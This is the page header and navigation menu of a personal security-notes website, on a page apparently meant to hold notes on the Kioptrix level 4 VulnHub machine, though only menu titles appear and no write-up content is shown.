<!doctype html><html lang=en class="js csstransforms3d"><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.69.2"><meta name=description content="Notes from Kioptrix level 4 from Vulnhub."><meta name=author content="Justin Perdok"><link rel=icon href=/images/favicon.png type=image/png><title>Level 4 :: My notes and snippets</title><link href=/css/nucleus.css rel=stylesheet><link href=/css/fontawesome-all.min.css rel=stylesheet><link href=/css/hybrid.css rel=stylesheet><link href=/css/featherlight.min.css rel=stylesheet><link href=/css/perfect-scrollbar.min.css rel=stylesheet><link href=/css/auto-complete.css rel=stylesheet><link href=/css/atom-one-dark-reasonable.css rel=stylesheet><link href=/css/theme.css rel=stylesheet><link href=/css/hugo-theme.css rel=stylesheet><link href=/css/theme-darkblue.css rel=stylesheet><script src=/js/jquery-3.3.1.min.js></script><style>:root #header+#content>#left>#rlblock_left{display:none!important}</style></head><body data-url=/notes/ctfs/vulnhub/kioptrix/level4/><nav id=sidebar><div id=header-wrapper><div id=header><a id=logo href=https://dev-hugo.justin-p.me/></a></div><div class=searchbox><label for=search-by><i class="fas fa-search"></i></label><input data-search-input id=search-by type=search placeholder=Search...>
<span data-search-clear><i class="fas fa-times"></i></span></div><script type=text/javascript src=/js/lunr.min.js></script><script type=text/javascript src=/js/auto-complete.js></script><script type=text/javascript>var baseurl="https:\/\/dev-hugo.justin-p.me\/";</script><script type=text/javascript src=/js/search.js></script></div><div class=highlightable><ul class=topics><li data-nav-id=/commands/ title=Commands class=dd-item><a href=/commands/><i class="fas fa-keyboard"></i>Commands</a><ul><li data-nav-id=/commands/unix/ title=Unix class=dd-item><a href=/commands/unix/><i class="fab fa-linux"></i>Unix</a><ul><li data-nav-id=/commands/unix/awk/ title=awk class=dd-item><a href=/commands/unix/awk/><i class="fas fa-terminal"></i>awk</a></li><li data-nav-id=/commands/unix/base64/ title=base64 class=dd-item><a href=/commands/unix/base64/><i class="fas fa-terminal"></i>base64</a></li><li data-nav-id=/commands/unix/bzip2/ title=bzip2 class=dd-item><a href=/commands/unix/bzip2/><i class="fas fa-terminal"></i>bzip2</a></li><li data-nav-id=/commands/unix/cron/ title=cron class=dd-item><a href=/commands/unix/cron/><i class="fas fa-terminal"></i>cron</a></li><li data-nav-id=/commands/unix/curl/ title=curl class=dd-item><a href=/commands/unix/curl/><i class="fas fa-terminal"></i>curl</a></li><li data-nav-id=/commands/unix/cut/ title=cut class=dd-item><a href=/commands/unix/cut/><i class="fas fa-terminal"></i>cut</a></li><li data-nav-id=/commands/unix/file/ title=file class=dd-item><a href=/commands/unix/file/><i class="fas fa-terminal"></i>file</a></li><li data-nav-id=/commands/unix/find/ title=find class=dd-item><a href=/commands/unix/find/><i class="fas fa-terminal"></i>find</a></li><li data-nav-id=/commands/unix/grep/ title=grep class=dd-item><a href=/commands/unix/grep/><i class="fas fa-terminal"></i>grep</a></li><li data-nav-id=/commands/unix/gzip-gunzip-zcat/ title="gzip gunzip zcat" class=dd-item><a href=/commands/unix/gzip-gunzip-zcat/><i class="fas fa-terminal"></i>gzip gunzip zcat</a></li><li data-nav-id=/commands/unix/md5sum/ title=md5sum class=dd-item><a href=/commands/unix/md5sum/><i class="fas fa-terminal"></i>md5sum</a></li><li data-nav-id=/commands/unix/random/ title=random class=dd-item><a href=/commands/unix/random/><i class="fas fa-terminal"></i>random</a></li><li data-nav-id=/commands/unix/rev/ title=rev class=dd-item><a href=/commands/unix/rev/><i class="fas fa-terminal"></i>rev</a></li><li data-nav-id=/commands/unix/scp/ title=scp class=dd-item><a href=/commands/unix/scp/><i class="fas fa-terminal"></i>scp</a></li><li data-nav-id=/commands/unix/sed/ title=sed class=dd-item><a href=/commands/unix/sed/><i class="fas fa-terminal"></i>sed</a></li><li data-nav-id=/commands/unix/sort/ title=sort class=dd-item><a href=/commands/unix/sort/><i class="fas fa-terminal"></i>sort</a></li><li data-nav-id=/commands/unix/strings/ title=strings class=dd-item><a href=/commands/unix/strings/><i class="fas fa-terminal"></i>strings</a></li><li data-nav-id=/commands/unix/tar/ title=tar class=dd-item><a href=/commands/unix/tar/><i class="fas fa-terminal"></i>tar</a></li><li data-nav-id=/commands/unix/touch/ title=touch class=dd-item><a href=/commands/unix/touch/><i class="fas fa-terminal"></i>touch</a></li><li data-nav-id=/commands/unix/tr/ title=tr class=dd-item><a href=/commands/unix/tr/><i class="fas fa-terminal"></i>tr</a></li><li data-nav-id=/commands/unix/uniq/ title=uniq class=dd-item><a href=/commands/unix/uniq/><i class="fas fa-terminal"></i>uniq</a></li><li data-nav-id=/commands/unix/xxd/ title=xxd class=dd-item><a href=/commands/unix/xxd/><i class="fas fa-terminal"></i>xxd</a></li></ul></li></ul></li><li data-nav-id=/guides/ title=Guides class=dd-item><a href=/guides/><i class="fas fa-arrow-alt-circle-right"></i>Guides</a><ul><li data-nav-id=/guides/ubuntu-vps/ title="Ubuntu VPS" class=dd-item><a href=/guides/ubuntu-vps/><i class="fab fa-ubuntu"></i>Ubuntu VPS</a><ul><li data-nav-id=/guides/ubuntu-vps/00-intro/ title="00. Introduction" class=dd-item><a href=/guides/ubuntu-vps/00-intro/>00. Introduction</a></li><li data-nav-id=/guides/ubuntu-vps/01-users/ title="01. Adding users" class=dd-item><a href=/guides/ubuntu-vps/01-users/>01. Adding users</a></li><li data-nav-id=/guides/ubuntu-vps/02-packges/ title="02. Managing of packages" class=dd-item><a href=/guides/ubuntu-vps/02-packges/>02. Managing of packages</a></li><li data-nav-id=/guides/ubuntu-vps/03-vim/ title="03. File editor: vim" class=dd-item><a href=/guides/ubuntu-vps/03-vim/>03. File editor: vim</a></li><li data-nav-id=/guides/ubuntu-vps/04-ufw/ title="04. UFW" class=dd-item><a href=/guides/ubuntu-vps/04-ufw/>04. UFW</a></li><li data-nav-id=/guides/ubuntu-vps/05-ssh-keys/ title="05. SSH Keys" class=dd-item><a href=/guides/ubuntu-vps/05-ssh-keys/>05. SSH Keys</a></li><li data-nav-id=/guides/ubuntu-vps/06-setup-sshd/ title="06. Setup sshd" class=dd-item><a href=/guides/ubuntu-vps/06-setup-sshd/>06. Setup sshd</a></li><li data-nav-id=/guides/ubuntu-vps/07-unattended-upgrades/ title="07. Unattended Upgrades" class=dd-item><a href=/guides/ubuntu-vps/07-unattended-upgrades/>07. Unattended Upgrades</a></li><li data-nav-id=/guides/ubuntu-vps/08-fail2ban/ title="08. Fail2ban" class=dd-item><a href=/guides/ubuntu-vps/08-fail2ban/>08. Fail2ban</a></li><li data-nav-id=/guides/ubuntu-vps/09-logwatch/ title="09. Logwatch" class=dd-item><a href=/guides/ubuntu-vps/09-logwatch/>09. Logwatch</a></li><li data-nav-id=/guides/ubuntu-vps/10-sysctl-optimization/ title="10. Sysctl Optimization" class=dd-item><a href=/guides/ubuntu-vps/10-sysctl-optimization/>10. Sysctl Optimization</a></li></ul></li></ul></li><li data-nav-id=/notes/ title=Notes class="dd-item
parent"><a href=/notes/><i class="fas fa-book-reader"></i>Notes</a><ul><li data-nav-id=/notes/courses/ title=Courses class=dd-item><a href=/notes/courses/><i class="fas fa-school"></i>Courses</a></li><li data-nav-id=/notes/ctfs/ title=CTFs class="dd-item
parent"><a href=/notes/ctfs/><i class="fas fa-flag"></i>CTFs</a><ul><li data-nav-id=/notes/ctfs/graficomspoorzoeker/ title="Graficom Spoorzoeker" class=dd-item><a href=/notes/ctfs/graficomspoorzoeker/><i class="fas fa-folder"></i>Graficom Spoorzoeker</a><ul><li data-nav-id=/notes/ctfs/graficomspoorzoeker/challanges/ title=Challanges class=dd-item><a href=/notes/ctfs/graficomspoorzoeker/challanges/><i class="fas fa-question-circle"></i>Challanges</a></li><li data-nav-id=/notes/ctfs/graficomspoorzoeker/solutions/ title=Solutions class=dd-item><a href=/notes/ctfs/graficomspoorzoeker/solutions/><i class="fas fa-check-circle"></i>Solutions</a></li></ul></li><li data-nav-id=/notes/ctfs/htb/ title=HTB class=dd-item><a href=/notes/ctfs/htb/><i class="fas fa-folder"></i>HTB</a><ul><li data-nav-id=/notes/ctfs/htb/bashed/ title=Bashed class=dd-item><a href=/notes/ctfs/htb/bashed/><i class="fas fa-server"></i>Bashed</a></li><li data-nav-id=/notes/ctfs/htb/blue/ title=Blue class=dd-item><a href=/notes/ctfs/htb/blue/><i class="fas fa-server"></i>Blue</a></li><li data-nav-id=/notes/ctfs/htb/devel/ title=Devel class=dd-item><a href=/notes/ctfs/htb/devel/><i class="fas fa-server"></i>Devel</a></li><li data-nav-id=/notes/ctfs/htb/grandpa/ title=Grandpa class=dd-item><a href=/notes/ctfs/htb/grandpa/><i class="fas fa-server"></i>Grandpa</a></li><li data-nav-id=/notes/ctfs/htb/granny/ title=Granny class=dd-item><a href=/notes/ctfs/htb/granny/><i class="fas fa-server"></i>Granny</a></li><li data-nav-id=/notes/ctfs/htb/jerry/ title=Jerry class=dd-item><a href=/notes/ctfs/htb/jerry/><i class="fas fa-server"></i>Jerry</a></li><li data-nav-id=/notes/ctfs/htb/lame/ title=Lame class=dd-item><a href=/notes/ctfs/htb/lame/><i class="fas fa-server"></i>Lame</a></li><li data-nav-id=/notes/ctfs/htb/legacy/ title=Legacy class=dd-item><a href=/notes/ctfs/htb/legacy/><i class="fas fa-server"></i>Legacy</a></li><li data-nav-id=/notes/ctfs/htb/metmon/ title=Netmon class=dd-item><a href=/notes/ctfs/htb/metmon/><i class="fas fa-server"></i>Netmon</a></li><li data-nav-id=/notes/ctfs/htb/nibbles/ title=Nibbles class=dd-item><a href=/notes/ctfs/htb/nibbles/><i class="fas fa-server"></i>Nibbles</a></li><li data-nav-id=/notes/ctfs/htb/optimum/ title=Optimum class=dd-item><a href=/notes/ctfs/htb/optimum/><i class="fas fa-server"></i>Optimum</a></li></ul></li><li data-nav-id=/notes/ctfs/overthewire/ title=OverTheWire class=dd-item><a href=/notes/ctfs/overthewire/><i class="fas fa-folder"></i>OverTheWire</a><ul><li data-nav-id=/notes/ctfs/overthewire/bandit/ title=Bandit class=dd-item><a href=/notes/ctfs/overthewire/bandit/><i class="fas fa-layer-group"></i>Bandit</a></li><li data-nav-id=/notes/ctfs/overthewire/natasa/ title=Natasa class=dd-item><a href=/notes/ctfs/overthewire/natasa/><i class="fas fa-layer-group"></i>Natasa</a></li></ul></li><li data-nav-id=/notes/ctfs/vulnhub/ title=VulnHub class="dd-item
parent"><a href=/notes/ctfs/vulnhub/><i class="fas fa-folder"></i>VulnHub</a><ul><li data-nav-id=/notes/ctfs/vulnhub/fristileaks/ title=Fristileaks class=dd-item><a href=/notes/ctfs/vulnhub/fristileaks/><i class="fas fa-folder"></i>Fristileaks</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/ title=Kioptrix class="dd-item
parent"><a href=/notes/ctfs/vulnhub/kioptrix/><i class="fas fa-folder"></i>Kioptrix</a><ul><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level1/ title="Level 1" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level1/><i class="fas fa-layer-group"></i>Level 1</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level2/ title="Level 2" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level2/><i class="fas fa-layer-group"></i>Level 2</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level3/ title="Level 3" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level3/><i class="fas fa-layer-group"></i>Level 3</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level4/ title="Level 4" class="dd-item active"><a href=/notes/ctfs/vulnhub/kioptrix/level4/><i class="fas fa-layer-group"></i>Level 4</a></li></ul></li><li data-nav-id=/notes/ctfs/vulnhub/pwnlab/ title=Pwnlab class=dd-item><a href=/notes/ctfs/vulnhub/pwnlab/><i class="fas fa-folder"></i>Pwnlab</a></li><li data-nav-id=/notes/ctfs/vulnhub/stapler/ title=Stapler class=dd-item><a href=/notes/ctfs/vulnhub/stapler/><i class="fas fa-folder"></i>Stapler</a></li><li data-nav-id=/notes/ctfs/vulnhub/vulnix/ title=Vulnix class=dd-item><a href=/notes/ctfs/vulnhub/vulnix/><i class="fas fa-folder"></i>Vulnix</a></li></ul></li><li data-nav-id=/notes/ctfs/vulnserver/ title=Vulnserver class=dd-item><a href=/notes/ctfs/vulnserver/><i class="fas fa-folder"></i>Vulnserver</a><ul><li data-nav-id=/notes/ctfs/vulnserver/trun/ title=TRUN class=dd-item><a href=/notes/ctfs/vulnserver/trun/><i class="fas fa-layer-group"></i>TRUN</a></li></ul></li></ul></li><li data-nav-id=/notes/exploit-development/ title="Exploit Development" class=dd-item><a href=/notes/exploit-development/><i class="fas fa-biohazard"></i>Exploit Development</a><ul><li data-nav-id=/notes/exploit-development/buffer-overflow/ title="Buffer Overflow" class=dd-item><a href=/notes/exploit-development/buffer-overflow/><i class="fas fa-layer-group"></i>Buffer Overflow</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/ title="Hacking Methodology" class=dd-item><a href=/notes/todo-hacking-methodology/><i class="fas fa-road"></i>Hacking Methodology</a><ul><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/ title="01. Reconnaissance" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/>01. Reconnaissance</a><ul><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/credential-gathering/ title="Credential Gathering" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/credential-gathering/>Credential Gathering</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/dns-recon/ title="DNS Recon" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/dns-recon/>DNS Recon</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/e-mail-gathering/ title="E-Mail Gathering" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/e-mail-gathering/>E-Mail Gathering</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/google-dorking/ title="Google Dorking" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/google-dorking/>Google Dorking</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/identify-website-technologies/ title="Identify Website Technologies" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/identify-website-technologies/>Identify Website Technologies</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/social-media/ title="Social Media" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/social-media/>Social Media</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/ title="02. Scanning and Enumeration" class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/>02. Scanning and Enumeration</a><ul><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/discover-open-ports/ title="Discover Open Ports" class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/discover-open-ports/>Discover Open Ports</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/finger/ title=Finger class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/finger/>Finger</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/nfs/ title=NFS class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/nfs/>NFS</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/searchsploit/ title=searchsploit class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/searchsploit/>searchsploit</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smb/ title=smb class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smb/>smb</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smtp/ title=smtp class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smtp/>smtp</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/web/ title=Web class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/web/>Web</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/ title="03. Exploitation" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/>03. Exploitation</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/ title="Active Directory" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/>Active Directory</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/ title="Attack Tools" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/>Attack Tools</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/mitm6/ title=mitm6 class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/mitm6/>mitm6</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/ntlmrelayx/ title=ntlmrelayx class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/ntlmrelayx/>ntlmrelayx</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/psexec/ title=psexec class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/psexec/>psexec</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/responder/ title=responder class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/responder/>responder</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/ipv6-dns-takeover/ title="IPv6 DNS Takeover" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/ipv6-dns-takeover/>IPv6 DNS Takeover</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/llmnr-and-nbt-ns/ title="LLMNR and NBT-NS" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/llmnr-and-nbt-ns/>LLMNR and NBT-NS</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/smb-relay/ title="SMB Relay" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/smb-relay/>SMB Relay</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/wpad/ title=WPAD class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/wpad/>WPAD</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/credential-stuffing/ title="Credential Stuffing" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/credential-stuffing/>Credential Stuffing</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/hydra/ title=Hydra class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/hydra/>Hydra</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/password-spraying/ title="Password Spraying" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/password-spraying/>Password Spraying</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/redis/ title=Redis class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/redis/>Redis</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/shells/ title=Shells class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/shells/>Shells</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/shells/msfvenom/ title=msfvenom class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/shells/msfvenom/>msfvenom</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/shells/payloads/ title=payloads class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/shells/payloads/>payloads</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/sql-injection/ title="SQL Injection" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/sql-injection/>SQL Injection</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/ title="04. Post Exploitation" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/>04. Post Exploitation</a><ul><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/ title=activedirectory class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/>activedirectory</a><ul><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/credential-access/ title=credentialaccess class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/credential-access/>credentialaccess</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/powerview/ title=powerview class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/powerview/>powerview</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/pdf/encrypted-password-protected-pdf/ title="encrypted password protected pdf" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/pdf/encrypted-password-protected-pdf/>encrypted password protected pdf</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/zip/encrypted-password-protected-zip/ title="encrypted password protected zip" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/zip/encrypted-password-protected-zip/>encrypted password protected zip</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hash-identifier/ title="hash identifier" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hash-identifier/>hash identifier</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hashcat/ title=hashcat class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hashcat/>hashcat</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/priv-esc/ title="priv esc" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/priv-esc/>priv esc</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/shell-escaping/ title="shell escaping" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/shell-escaping/>shell escaping</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/passwords/unshadow/ title=unshadow class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/passwords/unshadow/>unshadow</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/wordpress/wpadmin-plugin-upload/ title="wpadmin plugin upload" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/wordpress/wpadmin-plugin-upload/>wpadmin plugin upload</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/05-cleanup/ title="05. Cleanup" class=dd-item><a href=/notes/todo-hacking-methodology/05-cleanup/>05. Cleanup</a></li></ul></li><li data-nav-id=/notes/networking/ title=Networking class=dd-item><a href=/notes/networking/><i class="fas fa-network-wired"></i>Networking</a><ul><li data-nav-id=/notes/networking/osi-model/ title="OSI Model" class=dd-item><a href=/notes/networking/osi-model/><i class="fas fa-ethernet"></i>OSI Model</a><ul><li data-nav-id=/notes/networking/osi-model/layer1/ title="Layer 1" class=dd-item><a href=/notes/networking/osi-model/layer1/><i class="fas fa-ethernet"></i>Layer 1</a></li><li data-nav-id=/notes/networking/osi-model/layer2/ title="Layer 2" class=dd-item><a href=/notes/networking/osi-model/layer2/><i class="fas fa-ethernet"></i>Layer 2</a></li><li data-nav-id=/notes/networking/osi-model/layer3/ title="Layer 3" class=dd-item><a href=/notes/networking/osi-model/layer3/><i class="fas fa-ethernet"></i>Layer 3</a></li><li data-nav-id=/notes/networking/osi-model/layer4/ title="Layer 4" class=dd-item><a href=/notes/networking/osi-model/layer4/><i class="fas fa-ethernet"></i>Layer 4</a></li><li data-nav-id=/notes/networking/osi-model/layer5/ title="Layer 5" class=dd-item><a href=/notes/networking/osi-model/layer5/><i class="fas fa-ethernet"></i>Layer 5</a></li><li data-nav-id=/notes/networking/osi-model/layer6/ title="Layer 6" class=dd-item><a href=/notes/networking/osi-model/layer6/><i class="fas fa-ethernet"></i>Layer 6</a></li><li data-nav-id=/notes/networking/osi-model/layer7/ title="Layer 7" class=dd-item><a href=/notes/networking/osi-model/layer7/><i class="fas fa-ethernet"></i>Layer 7</a></li></ul></li><li data-nav-id=/notes/networking/tcpip-model/ title="TCP/IP Model" class=dd-item><a href=/notes/networking/tcpip-model/><i class="fas fa-ethernet"></i>TCP/IP Model</a></li></ul></li><li data-nav-id=/notes/programming/ title=Programming class=dd-item><a href=/notes/programming/><i class="fas fa-code"></i>Programming</a><ul><li data-nav-id=/notes/programming/bash/ title=Bash class=dd-item><a href=/notes/programming/bash/><i class="fas fa-layer-group"></i>Bash</a></li><li data-nav-id=/notes/programming/docker-compose/ title=Docker-Compose class=dd-item><a href=/notes/programming/docker-compose/><i class="fas fa-layer-group"></i>Docker-Compose</a></li><li data-nav-id=/notes/programming/dockerfile/ title=Dockerfile class=dd-item><a href=/notes/programming/dockerfile/><i class="fas fa-layer-group"></i>Dockerfile</a></li><li data-nav-id=/notes/programming/markdown/ title=Markdown class=dd-item><a href=/notes/programming/markdown/><i class="fas fa-layer-group"></i>Markdown</a></li><li data-nav-id=/notes/programming/mysql/ title=MySQL class=dd-item><a href=/notes/programming/mysql/><i class="fas fa-layer-group"></i>MySQL</a></li><li data-nav-id=/notes/programming/python/ title=Python class=dd-item><a href=/notes/programming/python/><i class="fas fa-layer-group"></i>Python</a></li></ul></li><li data-nav-id=/notes/z_private/ title=Z_Private class=dd-item><a href=/notes/z_private/><i class="fas fa-lock"></i>Private</a></li></ul></li><li data-nav-id=/tools/ title=Tools class=dd-item><a href=/tools/><i class="fas fa-tools"></i>Tools</a><ul><li data-nav-id=/tools/00-forensic/ title=00-Forensic class=dd-item><a href=/tools/00-forensic/><i class="fas fa-folder"></i>Forensic</a><ul><li data-nav-id=/tools/00-forensic/exiftool/ title=exiftool class=dd-item><a href=/tools/00-forensic/exiftool/><i class="fas fa-wrench"></i>exiftool</a></li><li data-nav-id=/tools/00-forensic/ssh-sha256-to-public-key/ title="ssh sha256 to public key" class=dd-item><a href=/tools/00-forensic/ssh-sha256-to-public-key/><i class="fas fa-wrench"></i>ssh sha256 to public key</a></li><li data-nav-id=/tools/00-forensic/usbrip/ title=usbrip class=dd-item><a href=/tools/00-forensic/usbrip/><i class="fas fa-wrench"></i>usbrip</a></li></ul></li><li data-nav-id=/tools/00-frameworks/ title=00-Frameworks class=dd-item><a href=/tools/00-frameworks/><i class="fas fa-folder"></i>Frameworks</a><ul><li data-nav-id=/tools/00-frameworks/empire/ title=empire class=dd-item><a href=/tools/00-frameworks/empire/><i class="fas fa-wrench"></i>empire</a></li><li data-nav-id=/tools/00-frameworks/metasploit/ title=metasploit class=dd-item><a href=/tools/00-frameworks/metasploit/><i class="fas fa-wrench"></i>metasploit</a></li></ul></li><li data-nav-id=/tools/00-steganography/ title=00-Steganography class=dd-item><a href=/tools/00-steganography/><i class="fas fa-folder"></i>Steganography</a><ul><li data-nav-id=/tools/00-steganography/binwalk/ title=binwalk class=dd-item><a href=/tools/00-steganography/binwalk/><i class="fas fa-wrench"></i>binwalk</a></li><li data-nav-id=/tools/00-steganography/foremost/ title=foremost class=dd-item><a href=/tools/00-steganography/foremost/><i class="fas fa-wrench"></i>foremost</a></li><li data-nav-id=/tools/00-steganography/steghide/ title=steghide class=dd-item><a href=/tools/00-steganography/steghide/><i class="fas fa-wrench"></i>steghide</a></li></ul></li><li data-nav-id=/tools/amass/ title=amass class=dd-item><a href=/tools/amass/><i class="fas fa-wrench"></i>amass</a></li><li data-nav-id=/tools/h8mail/ title=h8mail class=dd-item><a href=/tools/h8mail/><i class="fas fa-wrench"></i>h8mail</a></li><li data-nav-id=/tools/nc/ title=nc class=dd-item><a href=/tools/nc/><i class="fas fa-wrench"></i>nc</a></li><li data-nav-id=/tools/nmap/ title=Nmap class=dd-item><a href=/tools/nmap/><i class="fas fa-wrench"></i>Nmap</a></li><li data-nav-id=/tools/openssl/ title=openssl class=dd-item><a href=/tools/openssl/><i class="fas fa-wrench"></i>openssl</a><ul><li data-nav-id=/tools/openssl/s_client/ title=s_client class=dd-item><a href=/tools/openssl/s_client/><i class="fas fa-wrench"></i>s_client</a></li></ul></li><li data-nav-id=/tools/psdnsdumpsterapi/ title=PSDNSDumpsterAPI class=dd-item><a href=/tools/psdnsdumpsterapi/><i class="fas fa-wrench"></i>PSDNSDumpsterAPI</a></li><li data-nav-id=/tools/sublist3r/ title=sublist3r class=dd-item><a href=/tools/sublist3r/><i class="fas fa-wrench"></i>sublist3r</a></li><li data-nav-id=/tools/theharvester/ title=theHarvester class=dd-item><a href=/tools/theharvester/><i class="fas fa-wrench"></i>theHarvester</a></li><li data-nav-id=/tools/tmux/ title=tmux class=dd-item><a href=/tools/tmux/><i class="fas fa-wrench"></i>tmux</a></li><li data-nav-id=/tools/whatweb/ title=whatweb class=dd-item><a href=/tools/whatweb/><i class="fas fa-wrench"></i>whatweb</a></li></ul></li></ul><section id=shortcuts><h3>More</h3><ul><li><a class=padding href=https://github.com/justin-p/><i class="fab fa-github"></i>Github</a></li><li><a class=padding href=https://justin-p.me/><i class="fas fa-kiss-wink-heart"></i>Blog</a></li><li><a class=padding href=https://twitter.com/JustinPerdok><i class="fab fa-twitter"></i>Twitter</a></li><li><a class=padding href=https://www.linkedin.com/in/justinperdok/><i class="fab fa-linkedin-in"></i>LinkedIn</a></li></ul></section><section id=footer><p>Built with
<a href=https://github.com/matcornic/hugo-theme-learn>Hugo Learn</a>
and
